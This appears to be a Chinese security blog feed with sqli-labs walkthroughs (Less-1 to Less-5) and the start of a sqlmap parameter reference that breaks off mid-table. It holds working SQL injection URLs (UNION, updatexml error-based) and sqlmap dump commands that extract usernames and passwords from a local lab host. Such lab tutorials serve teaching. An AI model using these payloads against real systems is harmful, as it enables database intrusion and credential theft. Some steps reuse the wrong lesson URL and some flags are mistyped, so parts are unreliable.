&lt;pre tabindex="0">&lt;code>1. 确定参数构造方式
http://192.168.1.200:9080/Less-1/?id=1&amp;#39;\
2. 判断注入点
http://192.168.1.200:9080/Less-1/?id=1&amp;#39; and 1=1 --+
http://192.168.1.200:9080/Less-1/?id=1&amp;#39; and 1=2 --+
3. 确定字段数量
http://192.168.1.200:9080/Less-1/?id=1&amp;#39; order by 3 --+
http://192.168.1.200:9080/Less-1/?id=1&amp;#39; order by 4 --+
4. 判断数据显示点
http://192.168.1.200:9080/Less-1/?id=-1&amp;#39; union select 1,2,3 --+
5. 查询数据库名字和版本信息以及所有的表名
http://192.168.1.200:9080/Less-1/?id=-1&amp;#39; union select 1,group_concat(version(), &amp;#39;---&amp;#39;,database()),group_concat(table_name) from information_schema.tables where table_schema=database() --+
6. 查询 users 表的所有字段名
http://192.168.1.200:9080/Less-1/?id=-1&amp;#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; --+
7. 获得 users 表的所有记录
http://192.168.1.200:9080/Less-1/?id=-1&amp;#39; union select 1,group_concat(username),group_concat(password) from users --+
&lt;/code>&lt;/pre>&lt;h4 id="less-2">Less-2
&lt;/h4>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>请求方式&lt;/th>
&lt;th>注入方式&lt;/th>
&lt;th>注入位置&lt;/th>
&lt;th>参数构造&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>GET&lt;/td>
&lt;td>报错回注&lt;/td>
&lt;td>url&lt;/td>
&lt;td>?id=1 注入语句 &amp;ndash;+&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;pre tabindex="0">&lt;code>1. 确定参数构造方式
http://192.168.1.200:9080/Less-1/?id=1&amp;#39;\
2. 判断注入点
http://192.168.1.200:9080/Less-1/?id=1 and 1=1 --+
http://192.168.1.200:9080/Less-1/?id=1 and 1=2 --+
3. 确定字段数量
http://192.168.1.200:9080/Less-1/?id=1 order by 3 --+
http://192.168.1.200:9080/Less-1/?id=1 order by 4 --+
4. 判断数据显示点
http://192.168.1.200:9080/Less-1/?id=-1 union select 1,2,3 --+
5. 查询数据库名字和版本信息以及所有的表名
http://192.168.1.200:9080/Less-1/?id=-1 union select 1,group_concat(version(), &amp;#39;---&amp;#39;,database()),group_concat(table_name) from information_schema.tables where table_schema=database() --+
6. 查询 users 表的所有字段名
http://192.168.1.200:9080/Less-1/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; --+
7. 获得 users 表的所有记录
http://192.168.1.200:9080/Less-1/?id=-1 union select 1,group_concat(username),group_concat(password) from users --+
&lt;/code>&lt;/pre>&lt;h3 id="less-3">Less-3
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>请求方式&lt;/th>
&lt;th>注入方式&lt;/th>
&lt;th>注入位置&lt;/th>
&lt;th>参数构造&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>GET&lt;/td>
&lt;td>报错回注&lt;/td>
&lt;td>url&lt;/td>
&lt;td>?id=1‘) 注入语句 &amp;ndash;+&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;pre tabindex="0">&lt;code>1. 确定参数构造方式
http://192.168.1.200:9080/Less-1/?id=1&amp;#39;\
2. 判断注入点
http://192.168.1.200:9080/Less-1/?id=1&amp;#39;) and 1=1 --+
http://192.168.1.200:9080/Less-1/?id=1&amp;#39;) and 1=2 --+
3. 确定字段数量
http://192.168.1.200:9080/Less-1/?id=1&amp;#39;) order by 3 --+
http://192.168.1.200:9080/Less-1/?id=1 order by 4 --+
4. 判断数据显示点
http://192.168.1.200:9080/Less-1/?id=-1&amp;#39;) union select 1,2,3 --+
5. 查询数据库名字和版本信息以及所有的表名
http://192.168.1.200:9080/Less-1/?id=-1&amp;#39;) union select 1,group_concat(version(), &amp;#39;---&amp;#39;,database()),group_concat(table_name) from information_schema.tables where table_schema=database() --+
6. 查询 users 表的所有字段名
http://192.168.1.200:9080/Less-1/?id=-1&amp;#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; --+
7. 获得 users 表的所有记录
http://192.168.1.200:9080/Less-1/?id=-1&amp;#39;) union select 1,group_concat(username),group_concat(password) from users --+
&lt;/code>&lt;/pre>&lt;h3 id="less-4">Less-4
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>请求方式&lt;/th>
&lt;th>注入方式&lt;/th>
&lt;th>注入位置&lt;/th>
&lt;th>参数构造&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>GET&lt;/td>
&lt;td>报错回注&lt;/td>
&lt;td>url&lt;/td>
&lt;td>?id=1&amp;quot;) 注入语句 &amp;ndash;+&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;pre tabindex="0">&lt;code>1. 确定参数构造方式
http://192.168.1.200:9080/Less-1/?id=1&amp;#39;\
2. 判断注入点
http://192.168.1.200:9080/Less-1/?id=1&amp;#34;) and 1=1 --+
http://192.168.1.200:9080/Less-1/?id=1&amp;#34;) and 1=2 --+
3. 确定字段数量
http://192.168.1.200:9080/Less-1/?id=1&amp;#34;) order by 3 --+
http://192.168.1.200:9080/Less-1/?id=1&amp;#34;) order by 4 --+
4. 判断数据显示点
http://192.168.1.200:9080/Less-1/?id=-1&amp;#34;) union select 1,2,3 --+
5. 查询数据库名字和版本信息以及所有的表名
http://192.168.1.200:9080/Less-1/?id=-1&amp;#34;) union select 1,group_concat(version(), &amp;#39;---&amp;#39;,database()),group_concat(table_name) from information_schema.tables where table_schema=database() --+
6. 查询 users 表的所有字段名
http://192.168.1.200:9080/Less-1/?id=-1&amp;#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; --+
7. 获得 users 表的所有记录
http://192.168.1.200:9080/Less-1/?id=-1&amp;#34;) union select 1,group_concat(username),group_concat(password) from users --+
&lt;/code>&lt;/pre>&lt;h3 id="sqlmap">sqlmap
&lt;/h3>&lt;pre tabindex="0">&lt;code>1. 查询所有数据库
sqlmap -u &amp;#34;http://192.168.1.200:9080/Less-4/?id=1&amp;#34; --batch --dbs
2. 查询所有表
sqlmap -u &amp;#34;http://192.168.1.200:9080/Less-4/?id=1&amp;#34; --batch -D security --tables
3. 查询所有列名
sqlmap -u &amp;#34;http://192.168.1.200:9080/Less-4/?id=1&amp;#34; --batch -D security -T users --columns
4. 查询所有记录
sqlmap -u &amp;#34;http://192.168.1.200:9080/Less-4/?id=1&amp;#34; --batch -D security -T users -C &amp;#34;username,password&amp;#34; --dump
&lt;/code>&lt;/pre>&lt;h3 id="less-5">Less-5
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>请求方式&lt;/th>
&lt;th>注入方式&lt;/th>
&lt;th>注入位置&lt;/th>
&lt;th>参数构造&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>GET&lt;/td>
&lt;td>报错回注&lt;/td>
&lt;td>url&lt;/td>
&lt;td>?id=1&amp;quot;) 注入语句 &amp;ndash;+&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;pre tabindex="0">&lt;code>1. 确定参数构造方式
http://192.168.1.200:9080/Less-5/?id=1\
2. 判断注入点
http://192.168.1.200:9080/Less-5/?id=1&amp;#39; and 1=1 --+
http://192.168.1.200:9080/Less-5/?id=1&amp;#39; and 1=2 --+
3. 确定字段数量
http://192.168.1.200:9080/Less-5/?id=1&amp;#39; order by 3 --+
http://192.168.1.200:9080/Less-5/?id=1&amp;#39; order by 4 --+
5. 查询数据库名字和版本信息以及所有的表名
http://192.168.1.200:9080/Less-5/?id=1&amp;#39; and updatexml(1,concat(0x7e,(SELECT database()), (select @@version),0x7e),1) -- +
http://192.168.1.200:9080/Less-5/?id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e),1) -- +
6. 查询 users 表的所有字段名
http://192.168.1.200:9080/Less-5/?id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39;), 0x7e),1) -- +
7. 获得 users 表的所有记录
http://192.168.1.200:9080/Less-1/?id=-1&amp;#34;) union select 1,group_concat(username),group_concat(password) from users --+
&lt;/code>&lt;/pre></description></item><item><title>sqlmap 使用指南</title><link>https://wlynxg.github.io/blog/p/sqlmap-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/sqlmap-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid><description>&lt;h1 id="sqlmap-使用指南">sqlmap 使用指南
&lt;/h1>&lt;h2 id="一命令参数">一、命令参数
&lt;/h2>&lt;h3 id="1-通用">1. 通用
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>-h&lt;/td>
&lt;td>显示基本帮助信息&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-hh&lt;/td>
&lt;td>显示高级帮助信息&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;version&lt;/td>
&lt;td>显示版本号&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-s&lt;/td>
&lt;td>sqlite 会话文件保存位置&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-t&lt;/td>
&lt;td>记录所有 HTTP 流量到指定文件中&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;batch&lt;/td>
&lt;td>测试过程中， 执行所有默认配置&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;charset&lt;/td>
&lt;td>强制用于数据检索的字符编码&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;crawl&lt;/td>
&lt;td>从目标URL开始爬取网站&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;crawl-exclude&lt;/td>
&lt;td>禁止爬取某个页面（eg：logout）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;csv-del&lt;/td>
&lt;td>指定CSV输出中使用的的字符&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;dump-format&lt;/td>
&lt;td>储存数据的方式（CSV(default)，HTML，SQLITE）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;flush-session&lt;/td>
&lt;td>刷新当前目标的会话文件&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;fresh-queries&lt;/td>
&lt;td>忽略会话文件中储存的查询结果，重新查询&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;hex&lt;/td>
&lt;td>使用DBMS hex函数进行数据检索&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;outpout-dir&lt;/td>
&lt;td>自定义输出目录&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;save&lt;/td>
&lt;td>保存选项到 ini 配置文件中&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;scope&lt;/td>
&lt;td>使用正则表达式从提供的日志中提取信息&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;alert&lt;/td>
&lt;td>再找到SQL注入时运行主机操作系统命令&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;purge-output&lt;/td>
&lt;td>安全的从输出目录中删除所有内容&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;sqlmap-shell&lt;/td>
&lt;td>提示输入交互式sqlmap shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;update&lt;/td>
&lt;td>更新sqlmap&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="2-信息显示设置">2. 信息显示设置
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>-h&lt;/td>
&lt;td>设置显示信息等级（0-6 默认 1）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>只显示 Python 错误以及重要信息&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>显示信息以及警告&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>显示 debug 消息&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>显示注入 payload&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>显示 http 请求&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>5&lt;/td>
&lt;td>显示 http 响应头&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>6&lt;/td>
&lt;td>显示 http 响应内容&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="3-注入目标">3. 注入目标
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>-u&lt;/td>
&lt;td>指定目标 url&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-d&lt;/td>
&lt;td>直接连接数据库&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-l&lt;/td>
&lt;td>从 BurpSuit 代理日志的解析目标&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-r&lt;/td>
&lt;td>从文件中加载 http 请求&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-g&lt;/td>
&lt;td>从 google dork 的结果作为目标 url&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-c&lt;/td>
&lt;td>从 ini 配置文件中加载选项&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="4-请求头">4. 请求头
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>-A&lt;/td>
&lt;td>指定 User-Agent 头&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-H&lt;/td>
&lt;td>额外的 header&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-method&lt;/td>
&lt;td>指定 HTTP 方法（GET/POST）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;data&lt;/td>
&lt;td>通过 POST 提交数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;param-del&lt;/td>
&lt;td>指定参数分隔符&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;cookie&lt;/td>
&lt;td>指定 cookie 的值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;cookie-del&lt;/td>
&lt;td>指定cookie分隔符&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;drop-set-cookie&lt;/td>
&lt;td>扔掉 response 中的 set-cookie 头&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;random-agent&lt;/td>
&lt;td>使用随机的 User-Agent 头&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;host&lt;/td>
&lt;td>设置 host 头&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;referer&lt;/td>
&lt;td>指定 referer 头&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;headers&lt;/td>
&lt;td>额外的headers&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;auth-type&lt;/td>
&lt;td>http认证类型（Basic，NTLM，Digest）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;auith-cred&lt;/td>
&lt;td>http认证凭证（账号：密码）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;ignore-proxy&lt;/td>
&lt;td>忽略系统代理（常用于扫描本地文件）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;proxy&lt;/td>
&lt;td>使用代理&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;proxy-cred&lt;/td>
&lt;td>代理认证证书（账号：密码）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;delay&lt;/td>
&lt;td>设置两个请求之间延迟时间&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;timeout&lt;/td>
&lt;td>超时时来连接前等待（默认 30）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;retries&lt;/td>
&lt;td>连接超时时重试次数（默认 3）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;randomize&lt;/td>
&lt;td>随机更改指定的参数的值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;safe-url&lt;/td>
&lt;td>在测试期间经常访问的 URL&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;safe-post&lt;/td>
&lt;td>POST数据发送到安全的 URL&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;safe-freq&lt;/td>
&lt;td>两次请求之间穿插一个安全的URL&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;skip-urlencode&lt;/td>
&lt;td>跳过 payload 数据的 URL 编码&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;chunked&lt;/td>
&lt;td>使用 HTTP 分块传输加密 POST 请求&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;hpp&lt;/td>
&lt;td>使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;force-ssl&lt;/td>
&lt;td>强制使用 SSL/HTTPS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;eval=value&lt;/td>
&lt;td>请求之前提供Python代码（eg：&amp;ldquo;import hashlib;id2=hashlib.md5(id).hexdigest()&amp;quot;）&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="5-优化参数">5. 优化参数
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>-o&lt;/td>
&lt;td>打开所有优化开关&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;predict-output&lt;/td>
&lt;td>预测输出（与&amp;ndash;threads不兼容）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;keep-alive&lt;/td>
&lt;td>建立长久的HTTP(S)连接 (与&amp;ndash;proxy不兼容)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;null-connection&lt;/td>
&lt;td>空连接&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;threads=value&lt;/td>
&lt;td>设置线程(默认 1)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="6-注入参数">6. 注入参数
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>-p&lt;/td>
&lt;td>指定测试参数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;skip&lt;/td>
&lt;td>跳过指定参数的测试&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;skip-static&lt;/td>
&lt;td>跳过测试静态的参数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;dbms&lt;/td>
&lt;td>指定具体DBMS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;os&lt;/td>
&lt;td>指定DBMS操作系统&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;invalid-bignum&lt;/td>
&lt;td>使用大数字使值无效&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;invalid-logical&lt;/td>
&lt;td>使用逻辑符使值无效&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;invalid-string&lt;/td>
&lt;td>使用字符串使值无效&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;no-cast&lt;/td>
&lt;td>关闭payload铸造机制&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;no-escape&lt;/td>
&lt;td>关闭字符转义机制（默认自动开启）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;prefix&lt;/td>
&lt;td>加入payload前缀&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;suffix&lt;/td>
&lt;td>加入payload后缀&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;tamper&lt;/td>
&lt;td>指定使用的脚本，多个脚本之间用空格隔开&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="7-检测">7. 检测
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&amp;ndash;level&lt;/td>
&lt;td>指定测试的等级（1-5 默认为1）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;risk&lt;/td>
&lt;td>指定测试的风险（0-3 默认为1）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;string&lt;/td>
&lt;td>登录成功时，页面所含有的“关键字” 用于证明已经登录成功&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;not-string&lt;/td>
&lt;td>登录成功时，页面所含有的“关键字” 用于证明已经登录失败&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;code&lt;/td>
&lt;td>查询为真时，匹配的HTTP代码&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;smart&lt;/td>
&lt;td>当有大量检测目标时，只选择基于错误的检测结果&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;text-only&lt;/td>
&lt;td>仅基于文本内容比较网页&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;titles&lt;/td>
&lt;td>仅基于标题比较网页&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="8-注入技术">8. 注入技术
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>-technique&lt;/td>
&lt;td>指定sql注入技术（默认BEUSTQ）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;time-sec&lt;/td>
&lt;td>基于时间注入检测相应的延迟时间（默认为5秒）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;union-clos&lt;/td>
&lt;td>进行查询时，指定列的范围&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;union-char&lt;/td>
&lt;td>指定暴力破解列数的字符&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>B&lt;/td>
&lt;td>基于布尔的盲注&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>T&lt;/td>
&lt;td>基于时间的盲注&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>E&lt;/td>
&lt;td>基于报错的注入&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>U&lt;/td>
&lt;td>基于UNION查询注入&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>S&lt;/td>
&lt;td>基于多语句查询注入&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="9-指纹查询">9. 指纹查询
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>-f&lt;/td>
&lt;td>查询目标DBMS版本指纹信息&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="10-数据查询">10. 数据查询
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>-a&lt;/td>
&lt;td>查询所有&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-b&lt;/td>
&lt;td>查询目标 DBMS banner 信息&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;current-user&lt;/td>
&lt;td>查询目标DBMS当前用户&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;current-db&lt;/td>
&lt;td>查询目标 DBMS 当前数据库&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;is-dba&lt;/td>
&lt;td>查询目标 DBMS 当前用户是否为 DBA&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;users&lt;/td>
&lt;td>枚举目标 DBMS 所有的用户&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;paswords&lt;/td>
&lt;td>枚举目标 DBMS 用户密码哈希值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;privileges&lt;/td>
&lt;td>枚举目标 DBMS 用户的权限&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;roles&lt;/td>
&lt;td>枚举DBMS用户的角色&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;dbs&lt;/td>
&lt;td>枚举DBMS所有的数据库&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;tables&lt;/td>
&lt;td>枚举DBMS数据库中所有的表&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;columns&lt;/td>
&lt;td>枚举DBMS数据库表中所有的列&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;count&lt;/td>
&lt;td>检索表的条目的数量&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;dump&lt;/td>
&lt;td>存储DBMS数据库的表中的条目&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;dump-all&lt;/td>
&lt;td>存储DBMS所有数据库表中的条目&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;D db&lt;/td>
&lt;td>指定进行枚举的数据库名称&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;T table&lt;/td>
&lt;td>指定进行枚举的数据库表名称&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;C column&lt;/td>
&lt;td>指定进行枚举的数据库列名称&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;exclude-sysdbs&lt;/td>
&lt;td>枚举表时排除系统数据库&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;sql-query&lt;/td>
&lt;td>指定查询的sql语句&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;sql-shell&lt;/td>
&lt;td>提示输入一个交互式sql shell&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="11-暴力破解">11. 暴力破解
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&amp;ndash;common-tables&lt;/td>
&lt;td>暴力破解表&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;common-colomns&lt;/td>
&lt;td>暴力破解列&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="12-文件系统访问">12. 文件系统访问
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>参数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&amp;ndash;file-read&lt;/td>
&lt;td>从目标数据库管理文件系统读取文件&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;file-write&lt;/td>
&lt;td>上传文件到目标数据库管理文件系统&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;file-dest&lt;/td>
&lt;td>指定写入文件的绝对路径&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;os-cmd&lt;/td>
&lt;td>执行操作系统命令&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;os-shell&lt;/td>
&lt;td>交互式的系统shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;os-pwn&lt;/td>
&lt;td>获取一个OOB shell，Meterpreter或者VNC&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;os-smbrelay&lt;/td>
&lt;td>一键 获取一个OOB shell，Meterpreter或者VNC&lt;/td>
&lt;/tr>
&lt;tr>
